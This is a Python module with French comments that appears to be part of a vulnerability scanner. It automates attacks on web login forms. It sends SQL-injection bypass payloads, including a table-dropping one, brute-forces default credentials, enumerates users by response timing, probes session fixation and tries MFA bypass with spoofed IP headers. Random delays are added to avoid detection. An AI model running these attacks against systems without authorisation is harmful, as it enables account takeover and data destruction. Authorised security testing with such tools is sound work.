"""
Testeur d'authentification complet et professionnel
Tests avancés : bruteforce, user enumeration, MFA bypass, session management, JWT
"""

import asyncio
from typing import List, Dict, Tuple, Optional
from loguru import logger
import aiohttp
import re
import time
import json
import base64
import hmac
import hashlib
from urllib.parse import urlparse, urljoin, parse_qs
import random
from datetime import datetime, timedelta

from core.models import Vulnerabilite


class TesteurAuthBypass:
    """
    Testeur d'authentification complet avec méthodes avancées
    """

    def __init__(self, client_ia):
        self.client_ia = client_ia

        # Configuration avancée
        self.timeout = 10
        self.max_bruteforce_attempts = 50  # Limite pour éviter les bans
        self.delay_between_attempts = (1, 3)  # Délai aléatoire entre tentatives
        self.user_enum_threshold = 0.5  # Seuil pour détecter user enumeration (secondes)

        # Payloads SQL injection pour auth bypass
        self.payloads_sql_injection = [
            {'username': "admin' OR '1'='1", 'password': "anything"},
            {'username': "admin'--", 'password': "anything"},
            {'username': "admin' #", 'password': "anything"},
            {'username': "' OR 1=1--", 'password': "anything"},
            {'username': "admin'; DROP TABLE users--", 'password': "anything"},
            {'username': "admin' UNION SELECT 1--", 'password': "anything"},
        ]

        # Liste d'usernames courants pour user enumeration
        self.usernames_communs = [
            'admin', 'administrator', 'root', 'sysadmin', 'webmaster',
            'test', 'user', 'guest', 'demo', 'backup', 'support',
            'api', 'dev', 'developer', 'manager', 'owner'
        ]

        # Passwords courants pour bruteforce
        self.passwords_communs = [
            'admin', 'password', '123456', 'admin123', 'password123',
            'root', 'toor', 'qwerty', 'letmein', 'welcome', 'monkey',
            'dragon', 'master', 'test', 'guest', 'user'
        ]

        # Patterns pour détecter des formulaires d'authentification
        self.patterns_form = {
            'login': re.compile(r'<form[^>]*action=[^>]*login[^>]*>', re.IGNORECASE),
            'username': re.compile(r'<input[^>]*name=[\"\'](?:username|user|login|email)[\"\'][^>]*>', re.IGNORECASE),
            'password': re.compile(r'<input[^>]*name=[\"\'](?:password|pass|pwd)[\"\'][^>]*>', re.IGNORECASE),
            'csrf': re.compile(r'<input[^>]*name=[\"\'](csrf|token|authenticity_token)[\"\'][^>]*value=[\"\']([^\"\']+)[\"\']', re.IGNORECASE),
        }

    async def tester(self, url: str) -> List[Vulnerabilite]:
        """
        Test complet d'authentification avec toutes les méthodes avancées
        """
        vulnerabilites = []

        try:
            logger.info(f"🔐 Test d'authentification complet: {url}")

            # 1. Découverte des pages d'authentification
            pages_auth = await self._decouvrir_pages_auth(url)
            if not pages_auth:
                logger.debug("ℹ️  Aucune page d'authentification trouvée")
                return vulnerabilites

            logger.info(f"📋 {len(pages_auth)} page(s) d'authentification trouvée(s)")

            for page_auth in pages_auth:
                logger.debug(f"🔍 Analyse de: {page_auth}")

                # 2. Analyse des formulaires
                formulaires = await self._analyser_formulaires(page_auth)
                if not formulaires:
                    continue

                # 3. Tests pour chaque formulaire
                for formulaire in formulaires:
                    # 3.1 Auth bypass classique (SQL injection)
                    vuln_bypass = await self._test_auth_bypass_classique(page_auth, formulaire)
                    if vuln_bypass:
                        vulnerabilites.extend(vuln_bypass)

                    # 3.2 User enumeration
                    vuln_enum = await self._test_user_enumeration(page_auth, formulaire)
                    if vuln_enum:
                        vulnerabilites.extend(vuln_enum)

                    # 3.3 Password policies
                    vuln_policy = await self._test_password_policies(page_auth, formulaire)
                    if vuln_policy:
                        vulnerabilites.extend(vuln_policy)

                    # 3.4 Bruteforce intelligent
                    vuln_brute = await self._test_bruteforce_intelligent(page_auth, formulaire)
                    if vuln_brute:
                        vulnerabilites.extend(vuln_brute)

                    # 3.5 Session management
                    vuln_session = await self._test_session_management(page_auth, formulaire)
                    if vuln_session:
                        vulnerabilites.extend(vuln_session)

                    # 3.6 JWT token analysis
                    vuln_jwt = await self._test_jwt_analysis(page_auth, formulaire)
                    if vuln_jwt:
                        vulnerabilites.extend(vuln_jwt)

                    # 3.7 MFA bypass attempts
                    vuln_mfa = await self._test_mfa_bypass(page_auth, formulaire)
                    if vuln_mfa:
                        vulnerabilites.extend(vuln_mfa)

            # Éliminer les doublons
            vulnerabilites = self._dedupliquer_vulnerabilites(vulnerabilites)

            if vulnerabilites:
                logger.success(f"🚨 {len(vulnerabilites)} vulnérabilité(s) d'authentification détectée(s)")
            else:
                logger.info("✅ Aucune vulnérabilité d'authentification détectée")

        except Exception as e:
            logger.error(f"Erreur test authentification: {str(e)}")

        return vulnerabilites

    async def _decouvrir_pages_auth(self, url: str) -> List[str]:
        """Découvre les pages d'authentification du site"""
        pages_auth = []

        urls_a_tester = [
            url,  # Page principale
            f"{url}/login",
            f"{url}/signin",
            f"{url}/auth/login",
            f"{url}/admin/login",
            f"{url}/user/login",
            f"{url}/account/login",
            f"{url}/dashboard/login",
            f"{url}/secure/login",
            f"{url}/api/auth/login",
        ]

        try:
            async with aiohttp.ClientSession() as session:
                for test_url in urls_a_tester:
                    try:
                        async with session.get(
                            test_url,
                            timeout=aiohttp.ClientTimeout(total=self.timeout)
                        ) as response:
                            if response.status == 200:
                                contenu = await response.text()

                                # Chercher des signes d'authentification
                                signes_auth = [
                                    'login', 'signin', 'username', 'password',
                                    'log in', 'sign in', 'authentication'
                                ]

                                if any(signe in contenu.lower() for signe in signes_auth):
                                    pages_auth.append(test_url)
                                    logger.debug(f"   🔍 Page auth trouvée: {test_url}")

                    except:
                        continue

        except Exception as e:
            logger.debug(f"Erreur découverte pages auth: {str(e)}")

        return list(set(pages_auth))

    async def _analyser_formulaires(self, url: str) -> List[Dict]:
        """Analyse les formulaires d'authentification"""
        formulaires = []

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                    contenu = await response.text()

                    # Chercher tous les formulaires
                    forms = re.findall(r'<form[^>]*>.*?</form>', contenu, re.DOTALL | re.IGNORECASE)

                    for form in forms:
                        form_info = self._extraire_info_formulaire(form)
                        if form_info and form_info.get('has_username') and form_info.get('has_password'):
                            formulaires.append(form_info)
                            logger.debug("   📝 Formulaire d'authentification trouvé")

        except Exception as e:
            logger.debug(f"Erreur analyse formulaires: {str(e)}")

        return formulaires

    def _extraire_info_formulaire(self, form_html: str) -> Dict:
        """Extrait les informations d'un formulaire"""
        info = {
            'action': '',
            'method': 'POST',
            'has_username': False,
            'has_password': False,
            'has_csrf': False,
            'csrf_token': '',
            'inputs': []
        }

        # Action du formulaire
        action_match = re.search(r'action=[\"\']([^\"\']+)[\"\']', form_html, re.IGNORECASE)
        if action_match:
            info['action'] = action_match.group(1)

        # Méthode
        method_match = re.search(r'method=[\"\']([^\"\']+)[\"\']', form_html, re.IGNORECASE)
        if method_match:
            info['method'] = method_match.group(1).upper()

        # Champs username
        if re.search(r'name=[\"\'](username|user|login|email)[\"\']', form_html, re.IGNORECASE):
            info['has_username'] = True

        # Champs password
        if re.search(r'type=[\"\']password[\"\']', form_html, re.IGNORECASE):
            info['has_password'] = True

        # Token CSRF
        csrf_match = re.search(r'name=[\"\'](csrf|token|authenticity_token)[\"\'][^>]*value=[\"\']([^\"\']+)[\"\']', form_html, re.IGNORECASE)
        if csrf_match:
            info['has_csrf'] = True
            info['csrf_token'] = csrf_match.group(2)

        return info if info['has_username'] and info['has_password'] else {}

    async def _test_auth_bypass_classique(self, url: str, formulaire: Dict) -> List[Vulnerabilite]:
        """Test de contournement classique via SQL injection"""
        vulnerabilites = []

        try:
            action_url = urljoin(url, formulaire['action']) if formulaire['action'] else url

            async with aiohttp.ClientSession() as session:
                for payload in self.payloads_sql_injection:
                    try:
                        # Ajouter le token CSRF si présent
                        data = payload.copy()
                        if formulaire.get('has_csrf'):
                            data['csrf'] = formulaire['csrf_token']

                        async with session.post(
                            action_url,
                            data=data,
                            timeout=aiohttp.ClientTimeout(total=self.timeout),
                            allow_redirects=False
                        ) as response:

                            contenu = await response.text()

                            # Vérifier signes de succès
                            signes_succes = [
                                'dashboard', 'welcome', 'logout', 'profile',
                                'admin', 'panel', 'control', 'logged in'
                            ]

                            if response.status in [200, 302, 301] and \
                               any(s in contenu.lower() for s in signes_succes):

                                logger.warning("🚨 Auth bypass détecté!")

                                vuln = Vulnerabilite(
                                    type="Contournement d'authentification",
                                    severite="CRITIQUE",
                                    url=action_url,
                                    description="Contournement d'authentification via injection SQL dans le formulaire de login",
                                    payload=f"Username: {payload['username']}",
                                    preuve=f"Login réussi avec payload SQL injection: {payload['username']}",
                                    cvss_score=9.8,
                                    remediation="Utiliser des requêtes préparées (prepared statements) et valider toutes les entrées utilisateur"
                                )
                                vulnerabilites.append(vuln)
                                break

                        # Délai entre tentatives
                        await asyncio.sleep(random.uniform(*self.delay_between_attempts))

                    except Exception as e:
                        logger.debug(f"Erreur test bypass classique: {str(e)}")
                        continue

        except Exception as e:
            logger.debug(f"Erreur test auth bypass classique: {str(e)}")

        return vulnerabilites

    async def _test_user_enumeration(self, url: str, formulaire: Dict) -> List[Vulnerabilite]:
        """Test d'énumération d'utilisateurs via timing attacks et messages d'erreur"""
        vulnerabilites = []

        try:
            action_url = urljoin(url, formulaire['action']) if formulaire['action'] else url

            async with aiohttp.ClientSession() as session:
                # Tester avec des usernames existants et inexistants
                test_cases = [
                    ('admin', 'wrongpassword'),
                    ('administrator', 'wrongpassword'),
                    ('root', 'wrongpassword'),
                    ('nonexistentuser12345', 'wrongpassword'),
                    ('anotherfakeuser67890', 'wrongpassword'),
                ]

                timings = {}

                for username, password in test_cases:
                    try:
                        start_time = time.time()

                        data = {'username': username, 'password': password}
                        if formulaire.get('has_csrf'):
                            data['csrf'] = formulaire['csrf_token']

                        async with session.post(
                            action_url,
                            data=data,
                            timeout=aiohttp.ClientTimeout(total=self.timeout)
                        ) as response:
                            await response.text()  # Consommer la réponse

                        end_time = time.time()
                        timings[username] = end_time - start_time

                        logger.debug(f"   ⏱️  {username}: {timings[username]:.2f}s")
                    except:
                        continue

                # Analyser les timings pour détecter user enumeration
                if len(timings) >= 3:
                    valid_users = [u for u in timings.keys() if u in self.usernames_communs]
                    invalid_users = [u for u in timings.keys() if u not in self.usernames_communs]

                    if valid_users and invalid_users:
                        avg_valid = sum(timings[u] for u in valid_users) / len(valid_users)
                        avg_invalid = sum(timings[u] for u in invalid_users) / len(invalid_users)

                        # Si différence significative (> 0.5s)
                        if abs(avg_valid - avg_invalid) > self.user_enum_threshold:
                            logger.warning("🚨 User enumeration détectée via timing attack!")

                            vuln = Vulnerabilite(
                                type="Énumération d'utilisateurs",
                                severite="MOYEN",
                                url=action_url,
                                description="Énumération d'utilisateurs possible via timing attacks (différence de temps de réponse)",
                                payload=f"Timing difference: {abs(avg_valid - avg_invalid):.2f}s",
                                preuve=f"Utilisateurs valides: {avg_valid:.2f}s, Invalides: {avg_invalid:.2f}s",
                                cvss_score=5.3,
                                remediation="Utiliser des réponses uniformes en temps et contenu pour tous les échecs d'authentification"
                            )
                            vulnerabilites.append(vuln)

                # Tester les messages d'erreur pour user enumeration
                try:
                    # Tester avec username existant vs inexistant
                    data_valid = {'username': 'admin', 'password': 'wrong'}
                    data_invalid = {'username': 'nonexistentuser12345', 'password': 'wrong'}

                    if formulaire.get('has_csrf'):
                        data_valid['csrf'] = formulaire['csrf_token']
                        data_invalid['csrf'] = formulaire['csrf_token']

                    responses = {}
                    for label, data in [('valid', data_valid), ('invalid', data_invalid)]:
                        async with session.post(action_url, data=data) as response:
                            responses[label] = await response.text()

                    # Comparer les messages d'erreur
                    if responses['valid'] != responses['invalid']:
                        logger.warning("🚨 User enumeration détectée via messages d'erreur différents!")

                        vuln = Vulnerabilite(
                            type="Énumération d'utilisateurs",
                            severite="FAIBLE",
                            url=action_url,
                            description="Énumération d'utilisateurs possible via messages d'erreur différents",
                            payload="Messages d'erreur distincts pour utilisateurs valides/invalides",
                            preuve="Messages d'erreur différents entre utilisateurs existants et inexistants",
                            cvss_score=3.7,
                            remediation="Utiliser des messages d'erreur génériques identiques pour tous les échecs d'authentification"
                        )
                        vulnerabilites.append(vuln)

                except Exception as e:
                    logger.debug(f"Erreur test messages d'erreur: {str(e)}")

        except Exception as e:
            logger.debug(f"Erreur test user enumeration: {str(e)}")

        return vulnerabilites

    async def _test_password_policies(self, url: str, formulaire: Dict) -> List[Vulnerabilite]:
        """Test des politiques de mot de passe"""
        vulnerabilites = []

        try:
            action_url = urljoin(url, formulaire['action']) if formulaire['action'] else url

            async with aiohttp.ClientSession() as session:
                # Tester des mots de passe faibles
                weak_passwords = [
                    '123456',
                    'password',
                    'admin',
                    '123456789',
                    'qwerty',
                    'abc123',
                    'password123'
                ]

                for password in weak_passwords:
                    try:
                        data = {'username': 'testuser', 'password': password}
                        if formulaire.get('has_csrf'):
                            data['csrf'] = formulaire['csrf_token']

                        async with session.post(
                            action_url,
                            data=data,
                            timeout=aiohttp.ClientTimeout(total=self.timeout)
                        ) as response:
                            contenu = await response.text()

                            # Si login réussi avec mot de passe faible
                            signes_succes = ['dashboard', 'welcome', 'logout', 'logged in']
                            if any(s in contenu.lower() for s in signes_succes):
                                logger.warning(f"🚨 Mot de passe faible accepté: {password}")

                                vuln = Vulnerabilite(
                                    type="Politique de mot de passe faible",
                                    severite="ÉLEVÉ",
                                    url=action_url,
                                    description="Le système accepte des mots de passe faibles et courants",
                                    payload=f"Mot de passe faible: {password}",
                                    preuve=f"Login réussi avec mot de passe faible: {password}",
                                    cvss_score=7.5,
                                    remediation="Implémenter une politique de mot de passe forte (longueur minimale, complexité, blacklist de mots communs)"
                                )
                                vulnerabilites.append(vuln)
                                break

                        await asyncio.sleep(random.uniform(0.5, 1.5))

                    except:
                        continue

        except Exception as e:
            logger.debug(f"Erreur test password policies: {str(e)}")

        return vulnerabilites

    async def _test_bruteforce_intelligent(self, url: str, formulaire: Dict) -> List[Vulnerabilite]:
        """Bruteforce intelligent avec protection anti-ban"""
        vulnerabilites = []

        try:
            action_url = urljoin(url, formulaire['action']) if formulaire['action'] else url

            async with aiohttp.ClientSession() as session:
                consecutive_failures = 0
                rate_limit_detected = False

                # Tester seulement quelques combinaisons pour éviter les bans
                test_combinations = [
                    ('admin', 'admin'),
                    ('admin', 'password'),
                    ('admin', '123456'),
                    ('root', 'root'),
                    ('root', 'toor'),
                ]

                for username, password in test_combinations:
                    if consecutive_failures >= 3:
                        logger.debug("⚠️  Arrêt bruteforce - trop d'échecs consécutifs")
                        break

                    try:
                        data = {'username': username, 'password': password}
                        if formulaire.get('has_csrf'):
                            data['csrf'] = formulaire['csrf_token']

                        async with session.post(
                            action_url,
                            data=data,
                            timeout=aiohttp.ClientTimeout(total=self.timeout)
                        ) as response:
                            contenu = await response.text()

                            # Détecter rate limiting
                            if response.status == 429:
                                rate_limit_detected = True
                                logger.debug("🚦 Rate limiting détecté")
                                break

                            # Vérifier succès
                            signes_succes = ['dashboard', 'welcome', 'logout', 'logged in']
                            if any(s in contenu.lower() for s in signes_succes):
                                logger.warning("🚨 Bruteforce réussi!")

                                vuln = Vulnerabilite(
                                    type="Authentification vulnérable au bruteforce",
                                    severite="CRITIQUE",
                                    url=action_url,
                                    description="Le système est vulnérable aux attaques par bruteforce",
                                    payload=f"Combinaison: {username}:{password}",
                                    preuve=f"Login réussi avec combinaison faible: {username}:{password}",
                                    cvss_score=9.8,
                                    remediation="Implémenter rate limiting, CAPTCHA, verrouillage de compte, et authentification multi-facteurs"
                                )
                                vulnerabilites.append(vuln)
                                break

                            else:
                                consecutive_failures += 1

                        # Délai aléatoire pour éviter la détection
                        await asyncio.sleep(random.uniform(*self.delay_between_attempts))

                    except:
                        consecutive_failures += 1
                        continue

                # Signaler si rate limiting est absent
                if not rate_limit_detected and len(test_combinations) >= 3:
                    logger.warning("⚠️  Pas de rate limiting détecté")

                    vuln = Vulnerabilite(
                        type="Absence de protection contre bruteforce",
                        severite="ÉLEVÉ",
                        url=action_url,
                        description="Le système n'implémente pas de protection contre les attaques par bruteforce",
                        payload="Multiples tentatives de login sans blocage",
                        preuve="Rate limiting non détecté après plusieurs tentatives",
                        cvss_score=7.5,
                        remediation="Implémenter rate limiting, CAPTCHA, ou authentification multi-facteurs"
                    )
                    vulnerabilites.append(vuln)

        except Exception as e:
            logger.debug(f"Erreur test bruteforce: {str(e)}")

        return vulnerabilites

    async def _test_session_management(self, url: str, formulaire: Dict) -> List[Vulnerabilite]:
        """Test de gestion de session (fixation, hijacking)"""
        vulnerabilites = []

        try:
            action_url = urljoin(url, formulaire['action']) if formulaire['action'] else url

            async with aiohttp.ClientSession() as session:
                # Test 1: Session fixation
                try:
                    # Étape 1: Obtenir un cookie de session
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=self.timeout)) as response:
                        session_cookie = None
                        for cookie in response.cookies:
                            if 'session' in cookie.key.lower() or 'sid' in cookie.key.lower():
                                session_cookie = cookie
                                break

                    if session_cookie:
                        logger.debug("🔍 Test session fixation...")

                        # Étape 2: Tenter de fixer la session
                        fixed_session = session_cookie.value

                        # Étape 3: Essayer de se connecter avec la session fixée
                        data = {'username': 'admin', 'password': 'password'}
                        if formulaire.get('has_csrf'):
                            data['csrf'] = formulaire['csrf_token']

                        async with session.post(
                            action_url,
                            data=data,
                            cookies={session_cookie.key: fixed_session},
                            timeout=aiohttp.ClientTimeout(total=self.timeout)
                        ) as response:
                            contenu = await response.text()

                            # Vérifier si la session est préservée après login
                            if 'dashboard' in contenu.lower() and session_cookie.key in str(response.cookies):
                                logger.warning("🚨 Vulnérabilité de fixation de session détectée!")

                                vuln = Vulnerabilite(
                                    type="Fixation de session",
                                    severite="ÉLEVÉ",
                                    url=action_url,
                                    description="Le système est vulnérable aux attaques de fixation de session",
                                    payload=f"Cookie de session préservé: {session_cookie.key}",
                                    preuve="Session fixée maintenue après authentification réussie",
                                    cvss_score=8.5,
                                    remediation="Régénérer l'ID de session après authentification réussie"
                                )
                                vulnerabilites.append(vuln)

                except Exception as e:
                    logger.debug(f"Erreur test session fixation: {str(e)}")

                # Test 2: Session hijacking (vérifier si les sessions sont prévisibles)
                try:
                    logger.debug("🔍 Test session hijacking...")

                    # Collecter plusieurs IDs de session
                    session_ids = []
                    for i in range(3):
                        async with session.get(url) as response:
                            for cookie in response.cookies:
                                if 'session' in cookie.key.lower() or 'sid' in cookie.key.lower():
                                    session_ids.append(cookie.value)
                                    break

                        await asyncio.sleep(0.5)

                    # Vérifier si les sessions sont séquentielles ou prévisibles
                    if len(session_ids) >= 2:
                        # Vérifier pattern numérique
                        try:
                            ids_numeric = [int(sid, 16) for sid in session_ids if sid]
                            if len(ids_numeric) >= 2:
                                diffs = [ids_numeric[i+1] - ids_numeric[i] for i in range(len(ids_numeric)-1)]
                                if all(d == diffs[0] for d in diffs):  # Séquences arithmétiques
                                    logger.warning("🚨 Sessions prévisibles détectées!")

                                    vuln = Vulnerabilite(
                                        type="Sessions prévisibles",
                                        severite="ÉLEVÉ",
                                        url=url,
                                        description="Les IDs de session suivent un pattern prévisible",
                                        payload=f"Session IDs: {session_ids[:3]}",
                                        preuve="Sessions suivent une séquence arithmétique",
                                        cvss_score=8.5,
                                        remediation="Utiliser un générateur cryptographique fort pour les IDs de session (CSPRNG)"
                                    )
                                    vulnerabilites.append(vuln)
                        except:
                            pass

                except Exception as e:
                    logger.debug(f"Erreur test session hijacking: {str(e)}")

        except Exception as e:
            logger.debug(f"Erreur test session management: {str(e)}")

        return vulnerabilites

    async def _test_jwt_analysis(self, url: str, formulaire: Dict) -> List[Vulnerabilite]:
        """Analyse et attaques sur les tokens JWT"""
        vulnerabilites = []

        try:
            # Chercher des endpoints API qui pourraient utiliser JWT
            api_endpoints = [
                f"{url}/api/auth/login",
                f"{url}/api/login",
                f"{url}/auth/token",
                f"{url}/api/token",
            ]

            async with aiohttp.ClientSession() as session:
                for endpoint in api_endpoints:
                    try:
                        # Tester avec des credentials valides
                        data = {'username': 'admin', 'password': 'admin'}
                        headers = {'Content-Type': 'application/json'}

                        async with session.post(
                            endpoint,
                            json=data,
                            headers=headers,
                            timeout=aiohttp.ClientTimeout(total=self.timeout)
                        ) as response:

                            if response.status == 200:
                                contenu = await response.text()

                                # Chercher des tokens JWT dans la réponse
                                jwt_tokens = re.findall(r'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*', contenu)

                                for token in jwt_tokens:
                                    logger.debug("🔍 Analyse JWT token...")

                                    vuln_jwt = self._analyser_token_jwt(token)
                                    if vuln_jwt:
                                        vuln_jwt.url = endpoint
                                        vulnerabilites.extend(vuln_jwt)

                    except:
                        continue

        except Exception as e:
            logger.debug(f"Erreur test JWT: {str(e)}")

        return vulnerabilites

    def _analyser_token_jwt(self, token: str) -> List[Vulnerabilite]:
        """Analyse un token JWT pour des vulnérabilités"""
        vulnerabilites = []

        try:
            # Décoder le header et payload (sans vérification de signature)
            parts = token.split('.')
            if len(parts) != 3:
                return vulnerabilites

            # Décoder header
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '==').decode())
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode())

            # Vérifications de sécurité
            alg = header.get('alg', 'none')

            # 1. Algorithm confusion (alg: none)
            if alg == 'none':
                logger.warning("🚨 JWT avec algorithme 'none'!")

                vuln = Vulnerabilite(
                    type="JWT Algorithm Confusion",
                    severite="CRITIQUE",
                    url="",  # Sera défini par l'appelant
                    description="Token JWT vulnérable à l'algorithm confusion (alg: none)",
                    payload=f"Token: {token[:50]}...",
                    preuve="Algorithme JWT défini sur 'none'",
                    cvss_score=9.1,
                    remediation="Toujours vérifier l'algorithme et utiliser une liste blanche d'algorithmes autorisés"
                )
                vulnerabilites.append(vuln)

            # 2. Algorithmes faibles
            elif alg in ['HS256', 'HS384', 'HS512']:
                logger.warning("🚨 JWT avec algorithme HMAC (potentiellement vulnérable)")

                vuln = Vulnerabilite(
                    type="JWT avec clé faible",
                    severite="ÉLEVÉ",
                    url="",
                    description="Token JWT utilisant un algorithme HMAC potentiellement avec clé faible",
                    payload=f"Algorithme: {alg}",
                    preuve="Algorithme HMAC détecté, vérifier la robustesse de la clé",
                    cvss_score=7.5,
                    remediation="Utiliser RSA ou ECDSA avec des clés suffisamment longues"
                )
                vulnerabilites.append(vuln)

            # 3. Expiration absente ou lointaine
            if 'exp' in payload:
                exp_time = datetime.fromtimestamp(payload['exp'])
                now = datetime.now()

                if exp_time > now + timedelta(days=365*10):  # Plus de 10 ans
                    logger.warning("🚨 Token JWT avec expiration très lointaine")

                    vuln = Vulnerabilite(
                        type="JWT Expiration trop lointaine",
                        severite="MOYEN",
                        url="",
                        description="Token JWT avec date d'expiration excessive",
                        payload=f"Expiration: {exp_time.isoformat()}",
                        preuve="Token valide pendant plus de 10 ans",
                        cvss_score=5.3,
                        remediation="Définir des expirations appropriées (quelques heures à quelques jours)"
                    )
                    vulnerabilites.append(vuln)

            # 4. Claims sensibles dans le payload
            sensitive_claims = ['password', 'secret', 'key', 'token', 'admin']
            for claim in sensitive_claims:
                if claim in payload:
                    logger.warning(f"🚨 Donnée sensible dans JWT: {claim}")

                    vuln = Vulnerabilite(
                        type="JWT Data Leakage",
                        severite="ÉLEVÉ",
                        url="",
                        description="Token JWT contient des données sensibles",
                        payload=f"Claim sensible: {claim}",
                        preuve=f"Donnée '{claim}' trouvée dans le payload JWT",
                        cvss_score=7.5,
                        remediation="Ne jamais stocker de données sensibles dans les tokens JWT"
                    )
                    vulnerabilites.append(vuln)

        except Exception as e:
            logger.debug(f"Erreur analyse JWT: {str(e)}")

        return vulnerabilites

    async def _test_mfa_bypass(self, url: str, formulaire: Dict) -> List[Vulnerabilite]:
        """Tests de contournement MFA/2FA"""
        vulnerabilites = []

        try:
            action_url = urljoin(url, formulaire['action']) if formulaire['action'] else url

            async with aiohttp.ClientSession() as session:
                # Tester les endpoints MFA courants
                mfa_endpoints = [
                    f"{url}/auth/verify",
                    f"{url}/mfa/verify",
                    f"{url}/2fa/verify",
                    f"{url}/api/auth/verify-2fa",
                ]

                for endpoint in mfa_endpoints:
                    try:
                        # Essayer de bypass en modifiant les headers
                        headers_bypass = {
                            'X-Forwarded-For': '127.0.0.1',  # IP locale
                            'X-Real-IP': '127.0.0.1',
                            'X-Originating-IP': '127.0.0.1',
                        }

                        # Essayer avec un code MFA faible
                        data = {'code': '000000', 'token': '123456'}

                        async with session.post(
                            endpoint,
                            data=data,
                            headers=headers_bypass,
                            timeout=aiohttp.ClientTimeout(total=self.timeout)
                        ) as response:

                            if response.status == 200:
                                contenu = await response.text()
                                if 'success' in contenu.lower() or 'verified' in contenu.lower():
                                    logger.warning("🚨 MFA bypass possible!")

                                    vuln = Vulnerabilite(
                                        type="Contournement MFA",
                                        severite="CRITIQUE",
                                        url=endpoint,
                                        description="Authentification multi-facteurs contournable",
                                        payload="Headers IP spoofing + code faible",
                                        preuve="MFA bypass réussi avec headers spoofés",
                                        cvss_score=9.8,
                                        remediation="Valider l'IP source, utiliser TOTP/hardware tokens, implémenter rate limiting"
                                    )
                                    vulnerabilites.append(vuln)

                    except:
                        continue

        except Exception as e:
            logger.debug(f"Erreur test MFA bypass: {str(e)}")

        return vulnerabilites

    def _dedupliquer_vulnerabilites(self, vulnerabilites: List[Vulnerabilite]) -> List[Vulnerabilite]:
        """Élimine les vulnérabilités en double"""
        vues = {}

        for vuln in vulnerabilites:
            cle = f"{vuln.type}:{vuln.url}"
            if cle not in vues:
                vues[cle] = vuln

        return list(vues.values())

